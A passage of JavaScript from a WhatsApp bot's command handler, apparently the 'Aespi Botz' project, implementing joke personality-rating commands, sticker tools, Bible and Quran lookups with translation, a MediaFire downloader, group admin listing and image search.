					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await ArielStore.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppaespisp = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppaespisp, mentions: [bet]}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygcaespisp(`Tag Someone, Example : ${prefix + command} @aespisp`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygcaespisp(`Tag Someone, Example : ${prefix + command} @aespisp`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygcaespisp(`Tag Someone, Example : ${prefix + command} @aespisp`)
					const ArielSP =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = ArielSP[Math.floor(Math.random() * ArielSP.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/ArielSProject/ArielFolder/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ArielStore.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.ownername, })

}
break
case 'telestick': {
	if (m.isGroup) return aespispStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let aespispresources = await Telesticker(args[0])
		await replygcaespisp(`Sending ${aespispresources.length} stickers...`)
		if (m.isGroup && aespispresources.length > 30) {
			await replygcaespisp('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < aespispresources.length; i++) {
				ArielStore.sendMessage(m.sender, { sticker: { url: aespispresources[i].url }})
			}
		} else {
			for (let i = 0; i < aespispresources.length; i++) {
				ArielStore.sendMessage(m.chat, { sticker: { url: aespispresources[i].url }})
			}
		}
	} else replygcaespisp(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'setcmd': {
                if (!m.quoted) return replygcaespisp('Reply Message!')
                if (!m.quoted.fileSha256) return replygcaespisp('SHA256 Hash Missing')
                if (!text) return replygcaespisp(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcaespisp('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcaespisp(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcaespisp(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcaespisp('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcaespisp(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                ArielStore.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!aespispTheCreator) return aespispStickOwner()
                if (!m.quoted) return replygcaespisp('Reply Message!')
                if (!m.quoted.fileSha256) return replygcaespisp('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcaespisp('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcaespisp('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return replygcaespisp(`Example ${prefix+command} link`)
await aespispStickWait()
let krt = await scp2.ssweb(q)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: krt.result}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygcaespisp(`Error: ${error.message}`)
  }
  }
  break
  case 'translate':{
  	if (!q) return replygcaespisp(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygcaespisp(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcaespisp(quranSurah)

    if (json.data.recitation.full) {
      ArielStore.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcaespisp(`Error: ${error.message}`)
  }
  }
  break
  case 'mediafire': {
  	if (!args[0]) return replygcaespisp(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcaespisp(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    ArielStore.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : ftroli })
    }
    break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return aespispStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
   
}
break
case 'addlist':
if (!aespispTheCreator) return aespispStickOwner()
if (!m.isGroup) return aespispStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcaespisp(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return replygcaespisp(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await ArielStore.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
replygcaespisp(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
replygcaespisp(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!aespispBotInc) return aespispStickOwner()
if (!m.isGroup) return aespispStickGroup()
if (db_respon_list.length === 0) return replygcaespisp(`There is no message list in the database yet`)
if (!q) return replygcaespisp(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return replygcaespisp(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
replygcaespisp(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcaespisp(teks)
}
break
case 'gimage':{
if (!text) return replygcaespisp(`Usage: ${prefix}gimage ArielSProject github`);
ArielStore.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ``
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: bing }}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
